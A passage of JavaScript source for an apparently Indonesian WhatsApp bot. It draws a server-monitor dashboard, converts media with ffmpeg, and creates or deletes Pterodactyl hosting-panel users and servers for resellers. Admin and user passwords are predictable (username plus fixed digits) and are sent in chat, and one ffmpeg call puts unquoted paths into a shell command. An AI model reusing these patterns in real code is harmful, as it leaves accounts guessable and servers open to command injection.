        const formatTime = (seconds) => {
            seconds = Number(seconds);
            const d = Math.floor(seconds / (3600 * 24));
            const h = Math.floor(seconds % (3600 * 24) / 3600);
            const m = Math.floor(seconds % 3600 / 60);
            const s = Math.floor(seconds % 60);
            if (d > 0) return `${d}d ${h}h ${m}m`;
            if (h > 0) return `${h}h ${m}m`;
            return `${m}m ${s}s`;
        };

        function drawBackground(ctx, w, h) {
            const gradient = ctx.createLinearGradient(0, 0, w, h);
            gradient.addColorStop(0, THEME.bg);
            gradient.addColorStop(0.5, THEME.bgSecondary);
            gradient.addColorStop(1, THEME.bg);
            ctx.fillStyle = gradient;
            ctx.fillRect(0, 0, w, h);
            ctx.globalAlpha = 0.02;
            for (let i = 0; i < 100; i++) {
                const x = Math.random() * w;
                const y = Math.random() * h;
                const size = Math.random() * 2;
                ctx.fillStyle = THEME.textPrimary;
                ctx.beginPath();
                ctx.arc(x, y, size, 0, Math.PI * 2);
                ctx.fill();
            }
            ctx.globalAlpha = 1;
            ctx.strokeStyle = THEME.border;
            ctx.lineWidth = 1;
            for (let i = 0; i < w; i += 50) {
                ctx.globalAlpha = 0.03;
                ctx.beginPath(); ctx.moveTo(i, 0); ctx.lineTo(i, h); ctx.stroke();
            }
            for (let i = 0; i < h; i += 50) {
                ctx.globalAlpha = 0.03;
                ctx.beginPath(); ctx.moveTo(0, i); ctx.lineTo(w, i); ctx.stroke();
            }
            ctx.globalAlpha = 1;
        }

        function drawCard(ctx, x, y, w, h, radius) {
            ctx.save();
            ctx.shadowColor = THEME.glow;
            ctx.shadowBlur = 15;
            ctx.beginPath();
            ctx.roundRect(x, y, w, h, radius);
            ctx.fillStyle = THEME.card;
            ctx.fill();
            ctx.shadowBlur = 0;
            ctx.strokeStyle = THEME.border;
            ctx.lineWidth = 1;
            ctx.stroke();
            ctx.restore();
        }

        function drawIcon(ctx, x, y, type, color) {
            ctx.save();
            ctx.strokeStyle = color;
            ctx.fillStyle = color;
            ctx.lineWidth = 2.5;
            ctx.lineCap = 'round';
            ctx.lineJoin = 'round';
            switch (type) {
                case 'cpu':
                    ctx.strokeRect(x - 12, y - 12, 24, 24);
                    ctx.fillRect(x - 6, y - 6, 12, 12);
                    ctx.beginPath();
                    ctx.moveTo(x - 12, y - 8); ctx.lineTo(x - 16, y - 8);
                    ctx.moveTo(x - 12, y); ctx.lineTo(x - 16, y);
                    ctx.moveTo(x - 12, y + 8); ctx.lineTo(x - 16, y + 8);
                    ctx.moveTo(x + 12, y - 8); ctx.lineTo(x + 16, y - 8);
                    ctx.moveTo(x + 12, y); ctx.lineTo(x + 16, y);
                    ctx.moveTo(x + 12, y + 8); ctx.lineTo(x + 16, y + 8);
                    ctx.stroke();
                    break;
                case 'memory':
                    for (let i = 0; i < 4; i++) { ctx.strokeRect(x - 10 + i * 6, y - 12, 5, 24); }
                    break;
                case 'disk':
                    ctx.beginPath(); ctx.arc(x, y, 12, 0, Math.PI * 2); ctx.stroke();
                    ctx.beginPath(); ctx.arc(x, y, 8, 0, Math.PI * 2); ctx.stroke();
                    ctx.beginPath(); ctx.arc(x, y, 3, 0, Math.PI * 2); ctx.fill();
                    break;
                case 'network':
                    ctx.beginPath(); ctx.arc(x, y, 12, 0, Math.PI * 2); ctx.stroke();
                    ctx.beginPath(); ctx.moveTo(x, y - 8); ctx.lineTo(x, y + 8);
                    ctx.moveTo(x - 8, y); ctx.lineTo(x + 8, y); ctx.stroke();
                    ctx.beginPath(); ctx.arc(x - 6, y - 6, 2, 0, Math.PI * 2);
                    ctx.arc(x + 6, y - 6, 2, 0, Math.PI * 2);
                    ctx.arc(x - 6, y + 6, 2, 0, Math.PI * 2);
                    ctx.arc(x + 6, y + 6, 2, 0, Math.PI * 2);
                    ctx.fill();
                    break;
                case 'server':
                    for (let i = 0; i < 3; i++) {
                        ctx.strokeRect(x - 12, y - 10 + i * 8, 24, 6);
                        ctx.beginPath(); ctx.arc(x + 8, y - 7 + i * 8, 1.5, 0, Math.PI * 2); ctx.fill();
                    }
                    break;
                case 'clock':
                    ctx.beginPath(); ctx.arc(x, y, 12, 0, Math.PI * 2); ctx.stroke();
                    ctx.beginPath(); ctx.moveTo(x, y); ctx.lineTo(x, y - 8);
                    ctx.moveTo(x, y); ctx.lineTo(x + 6, y); ctx.stroke();
                    break;
            }
            ctx.restore();
        }

        function drawLogo(ctx, x, y, size) {
            ctx.save();
            const gradient = ctx.createLinearGradient(x - size, y - size, x + size, y + size);
            gradient.addColorStop(0, THEME.primary);
            gradient.addColorStop(0.5, THEME.cyan);
            gradient.addColorStop(1, THEME.purple);
            ctx.strokeStyle = gradient;
            ctx.lineWidth = 3;
            ctx.lineCap = 'round';
            ctx.beginPath(); ctx.moveTo(x - size, y); ctx.lineTo(x, y - size); ctx.lineTo(x + size, y); ctx.lineTo(x, y + size); ctx.closePath(); ctx.stroke();
            ctx.beginPath(); ctx.moveTo(x - size / 2, y); ctx.lineTo(x, y - size / 2); ctx.lineTo(x + size / 2, y); ctx.lineTo(x, y + size / 2); ctx.closePath(); ctx.stroke();
            ctx.restore();
        }

        function drawDonutChart(ctx, x, y, radius, lineWidth, percent, color) {
            ctx.save();
            ctx.lineCap = 'round';
            ctx.beginPath(); ctx.arc(x, y, radius, 0, Math.PI * 2);
            ctx.strokeStyle = THEME.bgSecondary; ctx.lineWidth = lineWidth; ctx.stroke();
            const startAngle = -Math.PI / 2;
            const endAngle = startAngle + (Math.PI * 2 * (percent / 100));
            ctx.shadowColor = color; ctx.shadowBlur = 10;
            ctx.beginPath(); ctx.arc(x, y, radius, startAngle, endAngle);
            ctx.strokeStyle = color; ctx.lineWidth = lineWidth; ctx.stroke();
            ctx.shadowBlur = 0;
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 28px Arial";
            ctx.textAlign = "center"; ctx.textBaseline = "middle";
            ctx.fillText(`${Math.round(percent)}%`, x, y);
            ctx.restore();
        }

        function drawProgressBar(ctx, x, y, w, h, percent, color, label, value) {
            ctx.fillStyle = THEME.bgSecondary; ctx.fillRect(x, y, w, h);
            const gradient = ctx.createLinearGradient(x, y, x + w, y);
            gradient.addColorStop(0, color); gradient.addColorStop(1, color + 'aa');
            ctx.fillStyle = gradient; ctx.fillRect(x, y, w * (percent / 100), h);
            ctx.strokeStyle = THEME.border; ctx.lineWidth = 1; ctx.strokeRect(x, y, w, h);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.textAlign = "left"; ctx.fillText(label, x, y - 6);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 11px Arial"; ctx.textAlign = "right"; ctx.fillText(value, x + w, y - 6);
        }

        function drawStatBox(ctx, x, y, w, h, label, value, color, iconType) {
            drawCard(ctx, x, y, w, h, 12);
            drawIcon(ctx, x + 28, y + 28, iconType, color);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.textAlign = "left"; ctx.fillText(label, x + 50, y + 22);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 16px Arial"; ctx.fillText(value, x + 50, y + 40);
        }

        async function renderDashboard(stats) {
            const W = 1200;
            const H = 800;
            const canvas = createCanvas(W, H);
            const ctx = canvas.getContext('2d');

            drawBackground(ctx, W, H);
            drawLogo(ctx, 60, 50, 20);

            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 32px Arial"; ctx.textAlign = "left"; ctx.fillText("SYSTEM MONITOR", 100, 58);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "13px Arial"; ctx.fillText("Real-time Performance Dashboard", 100, 80);

            const pingStatus = stats.ping < 100 ? THEME.success : stats.ping < 300 ? THEME.warning : THEME.danger;
            ctx.fillStyle = pingStatus; ctx.font = "bold 28px Arial"; ctx.textAlign = "right"; ctx.fillText(`${stats.ping}ms`, W - 50, 50);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "12px Arial"; ctx.fillText("LATENCY", W - 50, 70);

            const gradient = ctx.createLinearGradient(50, 100, W - 50, 100);
            gradient.addColorStop(0, THEME.primary); gradient.addColorStop(0.33, THEME.success); gradient.addColorStop(0.66, THEME.purple); gradient.addColorStop(1, THEME.cyan);
            ctx.strokeStyle = gradient; ctx.lineWidth = 2; ctx.beginPath(); ctx.moveTo(50, 100); ctx.lineTo(W - 50, 100); ctx.stroke();

            const mainY = 130, cardW = 260, cardH = 240, gap = 30;
            const x1 = 50, x2 = x1 + cardW + gap, x3 = x2 + cardW + gap, x4 = x3 + cardW + gap;

            drawCard(ctx, x1, mainY, cardW, cardH, 15);
            drawIcon(ctx, x1 + 30, mainY + 35, 'cpu', THEME.primary);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 18px Arial"; ctx.textAlign = "left"; ctx.fillText("CPU USAGE", x1 + 55, mainY + 40);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.fillText(`${stats.cpuCores} Cores @ ${stats.cpuSpeed} MHz`, x1 + 55, mainY + 58);
            drawDonutChart(ctx, x1 + cardW / 2, mainY + 140, 50, 12, stats.cpuLoad, THEME.primary);
            ctx.fillStyle = THEME.textTertiary; ctx.font = "10px Arial"; ctx.textAlign = "center"; ctx.fillText(stats.cpuModel.substring(0, 32), x1 + cardW / 2, mainY + 215);

            drawCard(ctx, x2, mainY, cardW, cardH, 15);
            drawIcon(ctx, x2 + 30, mainY + 35, 'memory', THEME.success);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 18px Arial"; ctx.textAlign = "left"; ctx.fillText("MEMORY", x2 + 55, mainY + 40);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.fillText(`Total: ${formatSize(stats.ramTotal)}`, x2 + 55, mainY + 58);
            const ramPercent = (stats.ramUsed / stats.ramTotal) * 100;
            drawDonutChart(ctx, x2 + cardW / 2, mainY + 140, 50, 12, ramPercent, THEME.success);
            ctx.fillStyle = THEME.textTertiary; ctx.font = "11px Arial"; ctx.textAlign = "center"; ctx.fillText(`${formatSize(stats.ramUsed)} Used`, x2 + cardW / 2, mainY + 205); ctx.fillText(`${formatSize(stats.ramTotal - stats.ramUsed)} Free`, x2 + cardW / 2, mainY + 220);

            drawCard(ctx, x3, mainY, cardW, cardH, 15);
            drawIcon(ctx, x3 + 30, mainY + 35, 'disk', THEME.purple);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 18px Arial"; ctx.textAlign = "left"; ctx.fillText("STORAGE", x3 + 55, mainY + 40);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.fillText(`Total: ${formatSize(stats.diskTotal)}`, x3 + 55, mainY + 58);
            let diskPercent = stats.diskTotal > 0 ? (stats.diskUsed / stats.diskTotal) * 100 : 0;
            drawDonutChart(ctx, x3 + cardW / 2, mainY + 140, 50, 12, diskPercent, THEME.purple);
            ctx.fillStyle = THEME.textTertiary; ctx.font = "11px Arial"; ctx.textAlign = "center"; ctx.fillText(`${formatSize(stats.diskUsed)} Used`, x3 + cardW / 2, mainY + 205); ctx.fillText(`${formatSize(stats.diskTotal - stats.diskUsed)} Free`, x3 + cardW / 2, mainY + 220);

            drawCard(ctx, x4, mainY, cardW, cardH, 15);
            drawIcon(ctx, x4 + 30, mainY + 35, 'network', THEME.cyan);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 18px Arial"; ctx.textAlign = "left"; ctx.fillText("NETWORK", x4 + 55, mainY + 40);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.fillText(`Interface: ${stats.networkInterface}`, x4 + 55, mainY + 58);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 13px Arial"; ctx.textAlign = "left"; ctx.fillText("RX (Download)", x4 + 30, mainY + 95);
            ctx.fillStyle = THEME.cyan; ctx.font = "bold 20px Arial"; ctx.fillText(formatSize(stats.networkRx), x4 + 30, mainY + 120);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 13px Arial"; ctx.fillText("TX (Upload)", x4 + 30, mainY + 155);
            ctx.fillStyle = THEME.pink; ctx.font = "bold 20px Arial"; ctx.fillText(formatSize(stats.networkTx), x4 + 30, mainY + 180);

            const statsY = 400, statW = 175, statH = 70, statGap = 20;
            drawStatBox(ctx, 50, statsY, statW, statH, "HOSTNAME", stats.hostname.substring(0, 15), THEME.primary, 'server');
            drawStatBox(ctx, 50 + (statW + statGap), statsY, statW, statH, "PLATFORM", `${stats.platform} (${stats.arch})`, THEME.success, 'server');
            drawStatBox(ctx, 50 + (statW + statGap) * 2, statsY, statW, statH, "BOT UPTIME", stats.uptimeBot, THEME.purple, 'clock');
            drawStatBox(ctx, 50 + (statW + statGap) * 3, statsY, statW, statH, "SERVER UPTIME", stats.uptimeServer, THEME.warning, 'clock');
            drawStatBox(ctx, 50 + (statW + statGap) * 4, statsY, statW, statH, "NODE.JS", stats.nodeVersion, THEME.cyan, 'server');

            const perfY = 500, perfH = 250, perfW = W - 100;
            drawCard(ctx, 50, perfY, perfW, perfH, 15);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 20px Arial"; ctx.textAlign = "left"; ctx.fillText("SYSTEM PERFORMANCE", 75, perfY + 35);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "12px Arial"; ctx.fillText("Real-time resource monitoring", 75, perfY + 55);

            const barY = perfY + 85, barW = 500, barH = 18, barGap = 35;
            drawProgressBar(ctx, 75, barY, barW, barH, stats.cpuLoad, THEME.primary, "CPU Load", `${stats.cpuLoad}%`);
            drawProgressBar(ctx, 75, barY + barGap, barW, barH, ramPercent, THEME.success, "Memory Usage", `${Math.round(ramPercent)}%`);
            drawProgressBar(ctx, 75, barY + barGap * 2, barW, barH, diskPercent, THEME.purple, "Disk Usage", `${Math.round(diskPercent)}%`);
            drawProgressBar(ctx, 75, barY + barGap * 3, barW, barH, Math.min(100, (stats.ping / 500) * 100), pingStatus, "Network Latency", `${stats.ping}ms`);

            const infoX = 620, infoStartY = perfY + 85, infoLineHeight = 28;
            let infoY = infoStartY;
            ctx.font = "13px Arial"; ctx.textAlign = "left";
            const drawInfoLine = (label, value) => {
                ctx.fillStyle = THEME.textSecondary; ctx.fillText(label, infoX, infoY);
                ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 13px Arial"; ctx.fillText(value, infoX + 150, infoY);
                ctx.font = "13px Arial"; infoY += infoLineHeight;
            };
            drawInfoLine("OS Release", stats.release);
            drawInfoLine("CPU Cores", `${stats.cpuCores} Cores`);
            drawInfoLine("CPU Speed", `${stats.cpuSpeed} MHz`);
            drawInfoLine("Total Memory", formatSize(stats.ramTotal));
            drawInfoLine("Free Memory", formatSize(stats.ramTotal - stats.ramUsed));
            ctx.fillStyle = THEME.textTertiary; ctx.font = "10px Arial"; ctx.textAlign = "center"; ctx.fillText(`Dashboard Generated: ${new Date().toLocaleString()}`, W / 2, H - 20);
            return canvas.toBuffer('image/png');
        }

        function getNetworkStats() {
            try {
                const interfaces = os.networkInterfaces();
                let totalRx = 0, totalTx = 0, activeInterface = 'N/A', ip = 'N/A';
                for (const [name, addrs] of Object.entries(interfaces)) {
                    if (name.toLowerCase().includes('lo')) continue;
                    for (const addr of addrs) {
                        if (addr.family === 'IPv4' && !addr.internal) { activeInterface = name; ip = addr.address; break; }
                    }
                }
                try {
                    const netstat = execSync("cat /proc/net/dev 2>/dev/null || echo ''").toString();
                    const lines = netstat.split('\n');
                    for (const line of lines) {
                        if (line.includes(':') && !line.includes('lo:')) {
                            const parts = line.trim().split(/\s+/);
                            if (parts.length >= 10) { totalRx += parseInt(parts[1]) || 0; totalTx += parseInt(parts[9]) || 0; }
                        }
                    }
                } catch (e) {}
                return { totalRx, totalTx, activeInterface, ip };
            } catch (e) {
                return { totalRx: 0, totalTx: 0, activeInterface: 'N/A', ip: 'N/A' };
            }
        }

        const start = performance.now();
        await new Promise(resolve => setTimeout(resolve, 10));
        const end = performance.now();
        const latency = (end - start).toFixed(2);

        const cpus = os.cpus();
        const totalMem = os.totalmem();
        const freeMem = os.freemem();
        const loadAvg = os.loadavg();
        const cpuPercent = Math.min(100, (loadAvg[0] * 100) / cpus.length).toFixed(1);

        let diskTotal = 0, diskUsed = 0;
        try {
            const df = execSync("df -k --output=size,used / 2>/dev/null").toString();
            const lines = df.trim().split("\n");
            if (lines.length > 1) {
                const [total, used] = lines[1].trim().split(/\s+/).map(Number);
                diskTotal = total * 1024;
                diskUsed = used * 1024;
            }
        } catch (e) {}

        const networkStats = getNetworkStats();

        const stats = {
            ping: latency,
            hostname: os.hostname(),
            platform: os.platform(),
            arch: os.arch(),
            release: os.release(),
            nodeVersion: process.version,
            uptimeBot: formatTime(process.uptime()),
            uptimeServer: formatTime(os.uptime()),
            cpuModel: cpus[0].model.trim(),
            cpuSpeed: cpus[0].speed,
            cpuCores: cpus.length,
            cpuLoad: cpuPercent,
            ramTotal: totalMem,
            ramUsed: totalMem - freeMem,
            diskTotal: diskTotal,
            diskUsed: diskUsed,
            networkRx: networkStats.totalRx,
            networkTx: networkStats.totalTx,
            networkInterface: networkStats.activeInterface,
            networkIP: networkStats.ip
        };

        const imageBuffer = await renderDashboard(stats);

        await sock.sendMessage(m.chat, {
            image: imageBuffer,
            caption: `*SERVER - INFORMATION 🚀*\n\n` +
                `- Latency: ${latency}ms\n` +
                `- CPU: ${stats.cpuLoad}%\n` +
                `- RAM: ${formatSize(stats.ramUsed)} / ${formatSize(stats.ramTotal)}\n` +
                `- Disk: ${formatSize(stats.diskUsed)} / ${formatSize(stats.diskTotal)}\n` +
                `- Network: ↓${formatSize(stats.networkRx)} ↑${formatSize(stats.networkTx)}`
        }, {
            quoted: m
        });

    } catch (e) {
        console.error(e);
        m.reply(`Error: ${e.message}`);
    }
}
break;

case "own": case "owner": {
await sock.sendContact(m.chat, [global.owner], global.namaOwner, "Developer Bot", m)
await m.reply(`Hai kak *${m.pushName}*, ini adalah kontak pembuat script ini dekatin aja lagi jomblo tu dev nya :v ✨`)
}
break 

// ** case tools menu **
case "toimg": case "toimage":{
  if (!qmsg) return reply("Reply sticker yang mau dikonversi!");
  if (!/webp/.test(mime)) return reply(`Balas stiker dengan caption *${prefix + command}*`);

  const mediaPath = await sock.downloadAndSaveMediaMessage(qmsg);
  const outputPath = getRandom(".png");

  exec(`ffmpeg -i ${mediaPath} ${outputPath}`, async (err) => {
    fs.unlinkSync(mediaPath);
    if (err) {
      console.error(err);
      return reply("Gagal mengonversi stiker ke gambar!");
    }

    try {
      const buffer = fs.readFileSync(outputPath);
      await sock.sendMessage(
        m.chat,
        { image: buffer, caption: "*Berhasil dikonversi ke gambar!*" },
        { quoted: m }
      );
    } catch (e) {
      console.error(e);
      reply("Terjadi kesalahan saat mengirim gambar.");
    } finally {
      fs.unlinkSync(outputPath);
    }
  });
}
break

case 'toptt': case 'tovn': case 'tovoicenote': {
    const quoted = m.quoted ? m.quoted : m;
    if (!/audio|video/.test(mime)) {
        return m.reply(`Reply ke video atau audio yang ingin dijadikan VN!\n\nContoh: *${prefix + command}*`);
    }

    m.reply("Prosess.....");

    let mediaPath = null;
    let outPath = null;

    try {
        mediaPath = await sock.downloadAndSaveMediaMessage(quoted);
        if (!mediaPath) return m.reply("Gagal mengunduh media.");

        outPath = path.join(process.cwd(), 'data', 'trash', `vn_${Date.now()}.ogg`);
        
        if (!fs.existsSync(path.dirname(outPath))) fs.mkdirSync(path.dirname(outPath), { recursive: true });

        await new Promise((resolve, reject) => {
            exec(`ffmpeg -y -i "${mediaPath}" -vn -c:a libopus -b:a 128k -ac 1 -ar 48000 -map_metadata -1 "${outPath}"`, (err) => {
                if (err) return reject(err);
                resolve();
            });
        });

        await sock.sendMessage(m.chat, {
            audio: { url: outPath },
            mimetype: "audio/ogg; codecs=opus",
            ptt: true
        }, { quoted: m });

        if (fs.existsSync(mediaPath)) fs.unlinkSync(mediaPath);
        if (fs.existsSync(outPath)) fs.unlinkSync(outPath);

    } catch (err) {
        console.error(err);
        if (mediaPath && fs.existsSync(mediaPath)) fs.unlinkSync(mediaPath);
        if (outPath && fs.existsSync(outPath)) fs.unlinkSync(outPath);
        m.reply("❌ Gagal mengonversi ke VN. Pastikan FFmpeg terinstal.");
    }
}
break;

// ** case menu create panel **
case "addgrupreseller":
case "addgrupreseller":
case "addseller": {
  if (!isAn) return reply(mess.owner)
  if (!m.isGroup) return reply(mess.group)
  const input = m.chat
  if (datagc.includes(input))
    return reply(`Grup ini sudah di beri akses reseller panel!`)
  datagc.push(input)
  await fs.writeFileSync("./data/reseller.json", JSON.stringify(datagc, null, 2))
  reply(`Berhasil menambah grup reseller panel ✅`)
}
break

case "delgrupseller":
case "delgrupreseller": {
  if (!isAn) return reply(mess.owner)
  if (datagc.length < 1) return reply("Tidak ada grup reseller panel!")
  if (!text && m.isGroup) {
    if (!datagc.includes(m.chat))
      return reply("Grup ini bukan grup reseller panel!")

    datagc.splice(datagc.indexOf(m.chat), 1)
    fs.writeFileSync("./data/reseller.json", JSON.stringify(datagc, null, 2))
    return reply("Berhasil menghapus grup reseller panel ✅")
  }

  if (!text)
    return reply(
      `Masukkan *nomor list* grup!
      
*Example:*
- ${prefix}delresseler 2
- ${prefix}listresseler (untuk lihat detail)`
    )

  if (text === "all") {
    datagc.length = 0
    fs.writeFileSync("./data/reseller.json", JSON.stringify(datagc, null, 2))
    return reply("Berhasil menghapus *semua* grup reseller panel ✅")
  }

  let nomor = parseInt(text)
  if (isNaN(nomor))
    return reply("Masukkan *angka* sesuai nomor di list!")

  let index = nomor - 1
  if (index < 0 || index >= datagc.length)
    return reply("Nomor tidak valid!")

  let removed = datagc[index]
  datagc.splice(index, 1)
  fs.writeFileSync("./data/reseller.json", JSON.stringify(datagc, null, 2))

  reply(
    `Berhasil menghapus grup reseller ✅
- ID Groups: *${removed}*`
  )
}
break

case "listgrupseller":
case "listress": {
  if (!isAn) return reply(mess.owner)
  if (datagc.length < 1) return reply("Tidak ada group reseller di data!")

  let teks = `*List all grup reseller*\n\n`
  let no = 1

  for (let id of datagc) {
    let name = "Tidak ditemukan"
    try {
      let meta = await sock.groupMetadata(id)
      name = meta.subject || name
    } catch {}

    teks += `${no}. *${name}*\n`
    teks += ` ┣𖣠 Id: \`${id}\`\n\n`
    no++
  }

  teks += `*Cara hapus:*
- ${prefix}delresseler nomornya
- ${prefix}delresseler langsung di grup`

  await sock.sendMessage(m.chat, { text: teks }, { quoted: m })
}
break

case "1gbv2": case "2gbv2": case "3gbv2": case "4gbv2": case "5gbv2": case "6gbv2": case "7gbv2": case "8gbv2": case "9gbv2": case "10gbv2": case "unlimitedv2": case "unliv2": {
if (!isAn && !isGrupPrem) return m.reply('Only owner dan grup dengan akses Reseller')
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gbv2") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gbv2") {
ram = "2000"
disknya = "2000"
cpu = "60"
} else if (command == "3gbv2") {
ram = "3000"
disknya = "3000"
cpu = "80"
} else if (command == "4gbv2") {
ram = "4000"
disknya = "4000"
cpu = "100"
} else if (command == "5gbv2") {
ram = "5000"
disknya = "5000"
cpu = "120"
} else if (command == "6gbv2") {
ram = "6000"
disknya = "6000"
cpu = "140"
} else if (command == "7gbv2") {
ram = "7000"
disknya = "7000"
cpu = "160"
} else if (command == "8gbv2") {
ram = "8000"
disknya = "8000"
cpu = "180"
} else if (command == "9gbv2") {
ram = "9000"
disknya = "9000"
cpu = "200"
} else if (command == "10gbv2") {
ram = "10000"
disknya = "10000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+"990"
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestidV2}/eggs/` + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggV2),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_21",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*🌐 Spesifikasi Server*
* Ram : *${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}*
* Disk : *${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}*
* CPU : *${cpu == "0" ? "Unlimited" : cpu+"%"}*
* ${global.domainV2}

*Syarat & Ketentuan :*
${global.teksPanel}
`
await fs.writeFileSync("akunpanel.txt", teks)
await sock.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
delete global.panel
}
break

case "listpanelv2": case "listpv2": case "listserverv2": {
if (!isAn) return m.reply(mess.owner)
if (!global.apikey) return m.reply("Apikey tidak ditemukan!\nPastikan di settings.js *global.apikey* sudah di isi!")
let page = 1
let allServers = []
  while (true) {
    let res = await fetch(`${global.domainV2}/api/application/servers?page=${page}`, {
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${global.apikeyV2}`
      }
    })

    let data = await res.json()
    if (!data.data || data.data.length === 0) break

    allServers.push(...data.data)

    if (!data.meta?.pagination || page >= data.meta.pagination.total_pages) break
    page++
  }

  if (!allServers.length) return m.reply("Tidak ada server panel.")

  let teks = `*List all server panel*\n> #Total: *${allServers.length} server*\n\n`
  let no = 1

  for (let srv of allServers) {
    let s = srv.attributes
    let uuid = s.uuid.split("-")[0]
    let status = "unknown"

    try {
      let res = await fetch(`${global.domain}/api/client/servers/${uuid}/resources`, {
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: `Bearer ${global.capikey}`
        }
      })
      let json = await res.json()
      status = json.attributes?.current_state?.toUpperCase() || "unknown"
    } catch (e) {
      status = "unknown"
    }

    teks += `  ⚪ ID Server : *${s.id}*\n`
    teks += `  ⚫ ID User : *${s.user}*\n`
    teks += `  📍 Nama : *${s.name}*\n`
    teks += `  💾 RAM : *${s.limits.memory == 0 ? "Unlimited" : (s.limits.memory / 1000) + "GB"}*\n`
    teks += `┣𖣠 Status : *${status}*\n\n`
  }
  return sock.sendMessage(m.chat, { text: teks }, { quoted: m })
}
break

case "delpanelv2":
case "delpv2": {
  if (!isAn) return m.reply(mess.owner)
  if (global.apikey.length < 1) return m.reply("Apikey tidak ditemukan!\nPastikan di settings.js *global.apikey* sudah di isi!")
  if (!args[0]) return m.reply(example(`id servernya\n\nuntuk melihat id server ketik *${prefix}listpanel*`))

  let f = await fetch(global.domainV2 + "/api/application/servers?page=1", {
    method: "GET",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
      Authorization: "Bearer " + global.apikeyV2
    }
  })
  let result = await f.json()
  let servers = result.data
  let deletedUserId = null
  let deletedServerName = null

  for (let server of servers) {
    let s = server.attributes
    if (args[0] == s.id.toString()) {
      deletedUserId = s.user // <-- ambil user ID dari server
      deletedServerName = s.name

      // Hapus server
      await fetch(global.domainV2 + `/api/application/servers/${s.id}`, {
        method: "DELETE",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: "Bearer " + global.apikeyV2
        }
      })
    }
  }
  if (!deletedUserId) return m.reply("*ID Server* Tidak Ditemukan")
  // Hapus user berdasarkan user ID
  await fetch(global.domainV2 + `/api/application/users/${deletedUserId}`, {
    method: "DELETE",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
      Authorization: "Bearer " + global.apikeyV2
    }
  })
  m.reply(`Berhasil Menghapus Akun Panel *${capital(deletedServerName)}* (Server & User)`)
}
break

case "cadminv2": case "cadpv2": {
if (!isAn) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+"001"
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password
})
})
